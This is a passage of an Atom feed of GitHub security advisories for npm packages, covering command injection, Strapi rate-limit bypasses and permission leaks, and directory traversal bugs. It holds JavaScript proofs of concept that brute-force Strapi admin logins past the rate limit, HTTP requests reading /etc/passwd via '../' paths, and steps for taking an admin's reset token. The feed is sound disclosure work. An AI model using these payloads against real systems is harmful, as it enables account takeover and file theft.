<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2023-09-13T18:01:40.225Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[node-prompt-here] OS Command Injection in node-prompt-here]]></title>
        <id>https://github.com/advisories/GHSA-f8fh-8rgm-227h</id>
        <link href="https://github.com/advisories/GHSA-f8fh-8rgm-227h"/>
        <updated>2023-09-13T17:35:36.000Z</updated>
        <content type="html"><![CDATA[<p>node-prompt-here through 1.0.1 allows execution of arbitrary commands. The <code>runCommand()</code> is called by <code>getDevices()</code> function in file <code>linux/manager.js</code>, which is required by the <code>index. process.env.NM_CLI</code> in the file <code>linux/manager.js</code>. This function is used to construct the argument of function <code>execSync()</code>, which can be controlled by users without any sanitization.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-7602">https://nvd.nist.gov/vuln/detail/CVE-2020-7602</a></li>
<li><a href="https://snyk.io/vuln/SNYK-JS-NODEPROMPTHERE-560115">https://snyk.io/vuln/SNYK-JS-NODEPROMPTHERE-560115</a></li>
<li><a href="https://github.com/advisories/GHSA-f8fh-8rgm-227h">https://github.com/advisories/GHSA-f8fh-8rgm-227h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f8fh-8rgm-227h</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2021-05-07T16:16:16.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[giting] OS Command Injection in giting]]></title>
        <id>https://github.com/advisories/GHSA-53xj-v576-3ch2</id>
        <link href="https://github.com/advisories/GHSA-53xj-v576-3ch2"/>
        <updated>2023-09-13T17:33:26.000Z</updated>
        <content type="html"><![CDATA[<p>giting version prior to 0.0.8 allows execution of arbritary commands. The first argument <code>repo</code> of function <code>pull()</code> is executed by the package without any validation.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2019-10802">https://nvd.nist.gov/vuln/detail/CVE-2019-10802</a></li>
<li><a href="https://snyk.io/vuln/SNYK-JS-GITING-559008">https://snyk.io/vuln/SNYK-JS-GITING-559008</a></li>
<li><a href="https://web.archive.org/web/20201208120654/https://github.com/MangoRaft/git/commit/9be41081f547d3dcef25e7d7c957bc2a3be2dfe0">https://web.archive.org/web/20201208120654/https://github.com/MangoRaft/git/commit/9be41081f547d3dcef25e7d7c957bc2a3be2dfe0</a></li>
<li><a href="https://github.com/advisories/GHSA-53xj-v576-3ch2">https://github.com/advisories/GHSA-53xj-v576-3ch2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-53xj-v576-3ch2</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2021-04-13T15:22:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@strapi/plugin-users-permissions] Strapi Improper Rate Limiting vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-24q2-59hm-rh9r</id>
        <link href="https://github.com/advisories/GHSA-24q2-59hm-rh9r"/>
        <updated>2023-09-13T16:32:26.000Z</updated>
        <content type="html"><![CDATA[<h3 id="1-summary">1. Summary</h3>
<p>There is a rate limit on the login function of Strapi's admin screen, but it is possible to circumvent it.</p>
<h3 id="2-details">2. Details</h3>
<p>It is possible to avoid this by modifying the rate-limited request path as follows.</p>
<ol>
<li>Manipulating request paths to upper or lower case. (Pattern 1)<ul>
<li>In this case, avoidance is possible with various patterns.</li>
</ul>
</li>
<li>Add path slashes to the end of the request path. (Pattern 2)</li>
</ol>
<h3 id="3-poc">3. PoC</h3>
<p>Access the administrator's login screen (<code>/admin/auth/login</code>) and execute the following PoC on the browser's console screen.</p>
<h4 id="pattern-1-uppercase-and-lowercase">Pattern 1 (uppercase and lowercase)</h4>
<pre><code class="language-js">// poc.js
(async () =&gt; {
  const data1 = {
    email: "admin@strapi.com",   // registered e-mail address
    password: "invalid_password",
  };
  const data2 = {
    email: "admin@strapi.com",
    password: "RyG5z-CE2-]*4e4",   // correct password
  };

  for (let i = 0; i &lt; 30; i++) {
    await fetch("http://localhost:1337/admin/login", {
      method: "POST",
      body: JSON.stringify(data1),
      headers: {
        "Content-Type": "application/json",
      },
    });
  }

  const res1 = await fetch("http://localhost:1337/admin/login", {
    method: "POST",
    body: JSON.stringify(data2),
    headers: {
      "Content-Type": "application/json",
    },
  });
  console.log(res1.status + " " + res1.statusText);

  const res2 = await fetch("http://localhost:1337/admin/Login", {  // capitalize part of path
    method: "POST",
    body: JSON.stringify(data2),
    headers: {
      "Content-Type": "application/json",
    },
  });
  console.log(res2.status + " " + res2.statusText);
})();
</code></pre>
<h5 id="this-poc-does-the-following">This PoC does the following:</h5>
<ol>
<li>Request 30 incorrect logins.</li>
<li>Execute the same request again and confirm that it is blocked by rate limit from the console screen. (<code>429 Too Many Requests</code>)</li>
<li>Next, falsify the pathname of the request (<strong><code>/admin/Login</code></strong>) and make a request again to confirm that it is possible to bypass the rate limit and log in. (<code>200 OK</code>)</li>
</ol>
<h4 id="pattern-2-trailing-slash">Pattern 2 (trailing slash)</h4>
<pre><code class="language-js">// poc.js
(async () =&gt; {
  const data1 = {
    email: "admin@strapi.com",   // registered e-mail address
    password: "invalid_password",
  };
  const data2 = {
    email: "admin@strapi.com",
    password: "RyG5z-CE2-]*4e4",   // correct password
  };

  for (let i = 0; i &lt; 30; i++) {
    await fetch("http://localhost:1337/admin/login", {
      method: "POST",
      body: JSON.stringify(data1),
      headers: {
        "Content-Type": "application/json",
      },
    });
  }

  const res1 = await fetch("http://localhost:1337/admin/login", {
    method: "POST",
    body: JSON.stringify(data2),
    headers: {
      "Content-Type": "application/json",
    },
  });
  console.log(res1.status + " " + res1.statusText);

  const res2 = await fetch("http://localhost:1337/admin/login/", {  // trailing slash
    method: "POST",
    body: JSON.stringify(data2),
    headers: {
      "Content-Type": "application/json",
    },
  });
  console.log(res2.status + " " + res2.statusText);
})();
</code></pre>
<h5 id="this-poc-does-the-following-1">This PoC does the following:</h5>
<ol>
<li>Request 30 incorrect logins.</li>
<li>Execute the same request again and confirm that it is blocked by rate limit from the console screen. (<code>429 Too Many Requests</code>)</li>
<li>Next, falsify the pathname of the request (<strong><code>/admin/login/</code></strong>) and make a request again to confirm that it is possible to bypass the rate limit and log in. (<code>200 OK</code>)</li>
</ol>
<h4 id="poc-video">PoC Video</h4>
<ul>
<li><a href="https://drive.google.com/file/d/1UHyt6UDpl28CXjltVJmqDvSEkkJIexiB/view?usp=share_link">PoC Video</a></li>
</ul>
<h3 id="4-impact">4. Impact</h3>
<p>It is possible to bypass the rate limit of the login function of the admin screen. 
Therefore, the possibility of unauthorized login by login brute force attack increases.</p>
<h3 id="5-measures">5. Measures</h3>
<p>Forcibly convert the request path used for rate limiting to upper case or lower case and judge it as the same path. (<code>ctx.request.path</code>)<br>Also, remove any extra slashes in the request path.</p>
<p><a href="https://github.com/strapi/strapi/blob/32d68f1f5677ed9a9a505b718c182c0a3f885426/packages/core/admin/server/middlewares/rateLimit.js#L31">https://github.com/strapi/strapi/blob/32d68f1f5677ed9a9a505b718c182c0a3f885426/packages/core/admin/server/middlewares/rateLimit.js#L31</a></p>
<h3 id="6-references">6. References</h3>
<ul>
<li><a href="https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/">OWASP: API2:2023 Broken Authentication</a></li>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html">OWASP: Authentication Cheat Sheet</a></li>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html#rate-limiting">OWASP: Denial of Service Cheat Sheet (Rate limiting)</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/strapi/strapi/security/advisories/GHSA-24q2-59hm-rh9r">https://github.com/strapi/strapi/security/advisories/GHSA-24q2-59hm-rh9r</a></li>
<li><a href="https://github.com/strapi/strapi/releases/tag/v4.12.1">https://github.com/strapi/strapi/releases/tag/v4.12.1</a></li>
<li><a href="https://github.com/advisories/GHSA-24q2-59hm-rh9r">https://github.com/advisories/GHSA-24q2-59hm-rh9r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-24q2-59hm-rh9r</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-09-13T16:32:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@strapi/admin] Strapi Improper Rate Limiting vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-24q2-59hm-rh9r</id>
        <link href="https://github.com/advisories/GHSA-24q2-59hm-rh9r"/>
        <updated>2023-09-13T16:32:26.000Z</updated>
        <content type="html"><![CDATA[<h3 id="1-summary">1. Summary</h3>
<p>There is a rate limit on the login function of Strapi's admin screen, but it is possible to circumvent it.</p>
<h3 id="2-details">2. Details</h3>
<p>It is possible to avoid this by modifying the rate-limited request path as follows.</p>
<ol>
<li>Manipulating request paths to upper or lower case. (Pattern 1)<ul>
<li>In this case, avoidance is possible with various patterns.</li>
</ul>
</li>
<li>Add path slashes to the end of the request path. (Pattern 2)</li>
</ol>
<h3 id="3-poc">3. PoC</h3>
<p>Access the administrator's login screen (<code>/admin/auth/login</code>) and execute the following PoC on the browser's console screen.</p>
<h4 id="pattern-1-uppercase-and-lowercase">Pattern 1 (uppercase and lowercase)</h4>
<pre><code class="language-js">// poc.js
(async () =&gt; {
  const data1 = {
    email: "admin@strapi.com",   // registered e-mail address
    password: "invalid_password",
  };
  const data2 = {
    email: "admin@strapi.com",
    password: "RyG5z-CE2-]*4e4",   // correct password
  };

  for (let i = 0; i &lt; 30; i++) {
    await fetch("http://localhost:1337/admin/login", {
      method: "POST",
      body: JSON.stringify(data1),
      headers: {
        "Content-Type": "application/json",
      },
    });
  }

  const res1 = await fetch("http://localhost:1337/admin/login", {
    method: "POST",
    body: JSON.stringify(data2),
    headers: {
      "Content-Type": "application/json",
    },
  });
  console.log(res1.status + " " + res1.statusText);

  const res2 = await fetch("http://localhost:1337/admin/Login", {  // capitalize part of path
    method: "POST",
    body: JSON.stringify(data2),
    headers: {
      "Content-Type": "application/json",
    },
  });
  console.log(res2.status + " " + res2.statusText);
})();
</code></pre>
<h5 id="this-poc-does-the-following">This PoC does the following:</h5>
<ol>
<li>Request 30 incorrect logins.</li>
<li>Execute the same request again and confirm that it is blocked by rate limit from the console screen. (<code>429 Too Many Requests</code>)</li>
<li>Next, falsify the pathname of the request (<strong><code>/admin/Login</code></strong>) and make a request again to confirm that it is possible to bypass the rate limit and log in. (<code>200 OK</code>)</li>
</ol>
<h4 id="pattern-2-trailing-slash">Pattern 2 (trailing slash)</h4>
<pre><code class="language-js">// poc.js
(async () =&gt; {
  const data1 = {
    email: "admin@strapi.com",   // registered e-mail address
    password: "invalid_password",
  };
  const data2 = {
    email: "admin@strapi.com",
    password: "RyG5z-CE2-]*4e4",   // correct password
  };

  for (let i = 0; i &lt; 30; i++) {
    await fetch("http://localhost:1337/admin/login", {
      method: "POST",
      body: JSON.stringify(data1),
      headers: {
        "Content-Type": "application/json",
      },
    });
  }

  const res1 = await fetch("http://localhost:1337/admin/login", {
    method: "POST",
    body: JSON.stringify(data2),
    headers: {
      "Content-Type": "application/json",
    },
  });
  console.log(res1.status + " " + res1.statusText);

  const res2 = await fetch("http://localhost:1337/admin/login/", {  // trailing slash
    method: "POST",
    body: JSON.stringify(data2),
    headers: {
      "Content-Type": "application/json",
    },
  });
  console.log(res2.status + " " + res2.statusText);
})();
</code></pre>
<h5 id="this-poc-does-the-following-1">This PoC does the following:</h5>
<ol>
<li>Request 30 incorrect logins.</li>
<li>Execute the same request again and confirm that it is blocked by rate limit from the console screen. (<code>429 Too Many Requests</code>)</li>
<li>Next, falsify the pathname of the request (<strong><code>/admin/login/</code></strong>) and make a request again to confirm that it is possible to bypass the rate limit and log in. (<code>200 OK</code>)</li>
</ol>
<h4 id="poc-video">PoC Video</h4>
<ul>
<li><a href="https://drive.google.com/file/d/1UHyt6UDpl28CXjltVJmqDvSEkkJIexiB/view?usp=share_link">PoC Video</a></li>
</ul>
<h3 id="4-impact">4. Impact</h3>
<p>It is possible to bypass the rate limit of the login function of the admin screen. 
Therefore, the possibility of unauthorized login by login brute force attack increases.</p>
<h3 id="5-measures">5. Measures</h3>
<p>Forcibly convert the request path used for rate limiting to upper case or lower case and judge it as the same path. (<code>ctx.request.path</code>)<br>Also, remove any extra slashes in the request path.</p>
<p><a href="https://github.com/strapi/strapi/blob/32d68f1f5677ed9a9a505b718c182c0a3f885426/packages/core/admin/server/middlewares/rateLimit.js#L31">https://github.com/strapi/strapi/blob/32d68f1f5677ed9a9a505b718c182c0a3f885426/packages/core/admin/server/middlewares/rateLimit.js#L31</a></p>
<h3 id="6-references">6. References</h3>
<ul>
<li><a href="https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/">OWASP: API2:2023 Broken Authentication</a></li>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html">OWASP: Authentication Cheat Sheet</a></li>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html#rate-limiting">OWASP: Denial of Service Cheat Sheet (Rate limiting)</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/strapi/strapi/security/advisories/GHSA-24q2-59hm-rh9r">https://github.com/strapi/strapi/security/advisories/GHSA-24q2-59hm-rh9r</a></li>
<li><a href="https://github.com/strapi/strapi/releases/tag/v4.12.1">https://github.com/strapi/strapi/releases/tag/v4.12.1</a></li>
<li><a href="https://github.com/advisories/GHSA-24q2-59hm-rh9r">https://github.com/advisories/GHSA-24q2-59hm-rh9r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-24q2-59hm-rh9r</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-09-13T16:32:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@strapi/plugin-content-manager] Strapi's field level permissions not being respected in relationship title]]></title>
        <id>https://github.com/advisories/GHSA-m284-85mf-cgrc</id>
        <link href="https://github.com/advisories/GHSA-m284-85mf-cgrc"/>
        <updated>2023-09-13T16:31:43.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Field level permissions not being respected in relationship title.
If I have a  relationship title and the relationship shows a field I don't have permission to see I will still be visible.</p>
<h3 id="details">Details</h3>
<p>No RBAC checks on on the relationship the relation endpoint returns</p>
<h3 id="poc">PoC</h3>
<h4 id="setup">Setup</h4>
<p>Create a fresh strapi instance
Create a new content type
in the newly created content type add a relation to the users-permissions user.
Save.
Create a users-permissions user
Use your created  content type and create an entry in it related to the users-permisisons user</p>
<p>Go to settings -&gt; Admin panel -&gt; Roles -&gt; Author
Give the author role full permissions on the content type your created.
Make sure they don't have any permission to see User
Save</p>
<p>Create a new admin account with only the author role</p>
<h4 id="cve">CVE</h4>
<p>login on the newly created author acount.
go to the content manager to the colection type you created with the relationship to users_permissions_user
You now see a field you don't have permissions to view.</p>
<h3 id="impact">Impact</h3>
<p>RBAC field level checks leaks data selected by the admin user as relationship title
What could be sensitive fields that they should not be allowed to see. by the person having this specific role.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/strapi/strapi/security/advisories/GHSA-m284-85mf-cgrc">https://github.com/strapi/strapi/security/advisories/GHSA-m284-85mf-cgrc</a></li>
<li><a href="https://github.com/strapi/strapi/releases/tag/v4.12.1">https://github.com/strapi/strapi/releases/tag/v4.12.1</a></li>
<li><a href="https://github.com/advisories/GHSA-m284-85mf-cgrc">https://github.com/advisories/GHSA-m284-85mf-cgrc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m284-85mf-cgrc</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-09-13T16:31:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@strapi/utils] Strapi may leak sensitive user information, user reset password, tokens via content-manager views]]></title>
        <id>https://github.com/advisories/GHSA-v8gg-4mq2-88q4</id>
        <link href="https://github.com/advisories/GHSA-v8gg-4mq2-88q4"/>
        <updated>2023-09-13T16:31:32.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>I can get access to user  reset password tokens if I have the configure view permissions
<img alt="b37a6fd9eae06027e7d91266f1908a3d" src="https://user-images.githubusercontent.com/34578426/246782921-fbc007d3-ffec-45de-a1f1-a4287cd507ac.png">
<img alt="6c1da5b3bfbb3bca97c8d064be0ecb05" src="https://user-images.githubusercontent.com/34578426/246783044-7d716dde-6f27-4d01-9521-42720c6ce92e.gif"></p>
<h3 id="details">Details</h3>
<p>/content-manager/relations route does not remove private fields or ensure that they can't be selected</p>
<h3 id="poc">PoC</h3>
<p>Install fresh strapi instance
start up strapi and create an account
create a new content-type
give the content-type a relation with admin users and save
go to Admin panel roles Author and then plugins.
Enable for content-manager collection types the configure view
In the collection time now only give them access to the collection you created for this.
Create a new admin user account with the Author role
Log out and request a password reset for the main admin user.
Login on the newly created account
go to the collection type you created for this test and click the create new entry button,
click in the create new entry view on configure view.
select the admin user relation we created click on resetPasswordToken
Now go back to the create an entry view and when selection the relation we created we now see the reset tokken</p>
<h3 id="impact">Impact</h3>
<p>Impact is that the none admin user now has the reset token of the admin users account and can resets its password using that to escalate his privilege's</p>
<p>Still you need the configure view permission to be able to escalate your privilege's </p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/strapi/strapi/security/advisories/GHSA-v8gg-4mq2-88q4">https://github.com/strapi/strapi/security/advisories/GHSA-v8gg-4mq2-88q4</a></li>
<li><a href="https://github.com/strapi/strapi/releases/tag/v4.11.7">https://github.com/strapi/strapi/releases/tag/v4.11.7</a></li>
<li><a href="https://github.com/advisories/GHSA-v8gg-4mq2-88q4">https://github.com/advisories/GHSA-v8gg-4mq2-88q4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v8gg-4mq2-88q4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-09-13T16:31:31.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@strapi/admin] Strapi may leak sensitive user information, user reset password, tokens via content-manager views]]></title>
        <id>https://github.com/advisories/GHSA-v8gg-4mq2-88q4</id>
        <link href="https://github.com/advisories/GHSA-v8gg-4mq2-88q4"/>
        <updated>2023-09-13T16:31:32.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>I can get access to user  reset password tokens if I have the configure view permissions
<img alt="b37a6fd9eae06027e7d91266f1908a3d" src="https://user-images.githubusercontent.com/34578426/246782921-fbc007d3-ffec-45de-a1f1-a4287cd507ac.png">
<img alt="6c1da5b3bfbb3bca97c8d064be0ecb05" src="https://user-images.githubusercontent.com/34578426/246783044-7d716dde-6f27-4d01-9521-42720c6ce92e.gif"></p>
<h3 id="details">Details</h3>
<p>/content-manager/relations route does not remove private fields or ensure that they can't be selected</p>
<h3 id="poc">PoC</h3>
<p>Install fresh strapi instance
start up strapi and create an account
create a new content-type
give the content-type a relation with admin users and save
go to Admin panel roles Author and then plugins.
Enable for content-manager collection types the configure view
In the collection time now only give them access to the collection you created for this.
Create a new admin user account with the Author role
Log out and request a password reset for the main admin user.
Login on the newly created account
go to the collection type you created for this test and click the create new entry button,
click in the create new entry view on configure view.
select the admin user relation we created click on resetPasswordToken
Now go back to the create an entry view and when selection the relation we created we now see the reset tokken</p>
<h3 id="impact">Impact</h3>
<p>Impact is that the none admin user now has the reset token of the admin users account and can resets its password using that to escalate his privilege's</p>
<p>Still you need the configure view permission to be able to escalate your privilege's </p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/strapi/strapi/security/advisories/GHSA-v8gg-4mq2-88q4">https://github.com/strapi/strapi/security/advisories/GHSA-v8gg-4mq2-88q4</a></li>
<li><a href="https://github.com/strapi/strapi/releases/tag/v4.11.7">https://github.com/strapi/strapi/releases/tag/v4.11.7</a></li>
<li><a href="https://github.com/advisories/GHSA-v8gg-4mq2-88q4">https://github.com/advisories/GHSA-v8gg-4mq2-88q4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v8gg-4mq2-88q4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-09-13T16:31:31.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@strapi/plugin-content-manager] Strapi may leak sensitive user information, user reset password, tokens via content-manager views]]></title>
        <id>https://github.com/advisories/GHSA-v8gg-4mq2-88q4</id>
        <link href="https://github.com/advisories/GHSA-v8gg-4mq2-88q4"/>
        <updated>2023-09-13T16:31:32.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>I can get access to user  reset password tokens if I have the configure view permissions
<img alt="b37a6fd9eae06027e7d91266f1908a3d" src="https://user-images.githubusercontent.com/34578426/246782921-fbc007d3-ffec-45de-a1f1-a4287cd507ac.png">
<img alt="6c1da5b3bfbb3bca97c8d064be0ecb05" src="https://user-images.githubusercontent.com/34578426/246783044-7d716dde-6f27-4d01-9521-42720c6ce92e.gif"></p>
<h3 id="details">Details</h3>
<p>/content-manager/relations route does not remove private fields or ensure that they can't be selected</p>
<h3 id="poc">PoC</h3>
<p>Install fresh strapi instance
start up strapi and create an account
create a new content-type
give the content-type a relation with admin users and save
go to Admin panel roles Author and then plugins.
Enable for content-manager collection types the configure view
In the collection time now only give them access to the collection you created for this.
Create a new admin user account with the Author role
Log out and request a password reset for the main admin user.
Login on the newly created account
go to the collection type you created for this test and click the create new entry button,
click in the create new entry view on configure view.
select the admin user relation we created click on resetPasswordToken
Now go back to the create an entry view and when selection the relation we created we now see the reset tokken</p>
<h3 id="impact">Impact</h3>
<p>Impact is that the none admin user now has the reset token of the admin users account and can resets its password using that to escalate his privilege's</p>
<p>Still you need the configure view permission to be able to escalate your privilege's </p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/strapi/strapi/security/advisories/GHSA-v8gg-4mq2-88q4">https://github.com/strapi/strapi/security/advisories/GHSA-v8gg-4mq2-88q4</a></li>
<li><a href="https://github.com/strapi/strapi/releases/tag/v4.11.7">https://github.com/strapi/strapi/releases/tag/v4.11.7</a></li>
<li><a href="https://github.com/advisories/GHSA-v8gg-4mq2-88q4">https://github.com/advisories/GHSA-v8gg-4mq2-88q4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v8gg-4mq2-88q4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-09-13T16:31:31.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[enserver] Directory Traversal in enserver]]></title>
        <id>https://github.com/advisories/GHSA-5c6f-jpx7-cwq6</id>
        <link href="https://github.com/advisories/GHSA-5c6f-jpx7-cwq6"/>
        <updated>2023-09-12T21:24:17.000Z</updated>
        <content type="html"><![CDATA[<p>Affected versions of <code>enserver</code> resolve relative file paths, resulting in a directory traversal vulnerability. A malicious actor can use this vulnerability to access files outside of the intended directory root, which may result in the disclosure of private files on the vulnerable system.</p>
<p><strong>Example request:</strong></p>
<pre><code class="language-http">GET /../../../../../../../../../../etc/passwd HTTP/1.1
host:foo
</code></pre>
<h2 id="recommendation">Recommendation</h2>
<p>No patch is available for this vulnerability.</p>
<p>It is recommended that the package is only used for local development, and if the functionality is needed for production, a different package is used instead.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/JacksonGL/NPM-Vuln-PoC/blob/master/directory-traversal/enserver">https://github.com/JacksonGL/NPM-Vuln-PoC/blob/master/directory-traversal/enserver</a></li>
<li><a href="https://www.npmjs.com/advisories/425">https://www.npmjs.com/advisories/425</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2017-16209">https://nvd.nist.gov/vuln/detail/CVE-2017-16209</a></li>
<li><a href="https://github.com/advisories/GHSA-5c6f-jpx7-cwq6">https://github.com/advisories/GHSA-5c6f-jpx7-cwq6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5c6f-jpx7-cwq6</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2020-09-01T18:13:11.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[susu-sum] Directory Traversal in susu-sum]]></title>
        <id>https://github.com/advisories/GHSA-w7jg-972m-rphv</id>
        <link href="https://github.com/advisories/GHSA-w7jg-972m-rphv"/>
        <updated>2023-09-12T21:23:59.000Z</updated>
        <content type="html"><![CDATA[<p>Affected versions of <code>susu-sum</code> resolve relative file paths, resulting in a directory traversal vulnerability. A malicious actor can use this vulnerability to access files outside of the intended directory root, which may result in the disclosure of private files on the vulnerable system.</p>
<p><strong>Example request:</strong></p>
<pre><code class="language-http">GET /../../../../../../../../../../etc/passwd HTTP/1.1
host:foo
</code></pre>
<h2 id="recommendation">Recommendation</h2>
<p>No patch is available for this vulnerability.</p>
<p>It is recommended that the package is only used for local development, and if the functionality is needed for production, a different package is used instead.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/JacksonGL/NPM-Vuln-PoC/blob/master/directory-traversal/susu-sum">https://github.com/JacksonGL/NPM-Vuln-PoC/blob/master/directory-traversal/susu-sum</a></li>
<li><a href="https://www.npmjs.com/advisories/429">https://www.npmjs.com/advisories/429</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2017-16199">https://nvd.nist.gov/vuln/detail/CVE-2017-16199</a></li>
<li><a href="https://github.com/advisories/GHSA-w7jg-972m-rphv">https://github.com/advisories/GHSA-w7jg-972m-rphv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w7jg-972m-rphv</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2020-09-01T18:17:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[fbr-client] Directory Traversal in fbr-client]]></title>
        <id>https://github.com/advisories/GHSA-qmhf-qg6f-pc4v</id>
        <link href="https://github.com/advisories/GHSA-qmhf-qg6f-pc4v"/>
        <updated>2023-09-12T21:23:22.000Z</updated>
        <content type="html"><![CDATA[<p>Affected versions of <code>fbr-client</code> resolve relative file paths, resulting in a directory traversal vulnerability. A malicious actor can use this vulnerability to access files outside of the intended directory root, which may result in the disclosure of private files on the vulnerable system.</p>
<p><strong>Example request:</strong></p>
<pre><code class="language-http">GET /../../../../../../../../../../etc/passwd HTTP/1.1
host:foo
</code></pre>
<h2 id="recommendation">Recommendation</h2>
<p>No patch is available for this vulnerability.</p>
<p>It is recommended that the package is only used for local development, and if the functionality is needed for production, a different package is used instead.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2017-16217">https://nvd.nist.gov/vuln/detail/CVE-2017-16217</a></li>
<li><a href="https://github.com/JacksonGL/NPM-Vuln-PoC/blob/master/directory-traversal/fbr-client">https://github.com/JacksonGL/NPM-Vuln-PoC/blob/master/directory-traversal/fbr-client</a></li>
<li><a href="https://github.com/advisories/GHSA-qmhf-qg6f-pc4v">https://github.com/advisories/GHSA-qmhf-qg6f-pc4v</a></li>
<li><a href="https://www.npmjs.com/advisories/449">https://www.npmjs.com/advisories/449</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qmhf-qg6f-pc4v</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2018-07-23T20:39:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tmock] Directory Traversal in tmock]]></title>
        <id>https://github.com/advisories/GHSA-j6w4-pg6p-5mrv</id>
        <link href="https://github.com/advisories/GHSA-j6w4-pg6p-5mrv"/>
        <updated>2023-09-12T21:19:52.000Z</updated>
        <content type="html"><![CDATA[<p><code>tmock</code> is a static file server.</p>
<p><code>tmock</code> is vulnerable to a directory traversal issue, giving an attacker access to the filesystem by placing "../" in the url.</p>
<p><strong>Example request:</strong></p>
<pre><code class="language-http">GET /../../../../../../../../../../etc/passwd HTTP/1.1
host: localhost
</code></pre>
<p> and server Response:</p>
<pre><code class="language-http">HTTP/1.1 200 OK
Date: Thu, 04 May 2017 23:59:18 GMT
Connection: keep-alive
Transfer-Encoding: chunked

{contents of /etc/passwd}
</code></pre>
<h2 id="recommendation">Recommendation</h2>
<p>No patch is available for this vulnerability.</p>
<p>It is recommended that the package is only used for local development, and if the functionality is needed for production, a different package is used instead.</p>
<h3 id="references">References</h3>
<ul>
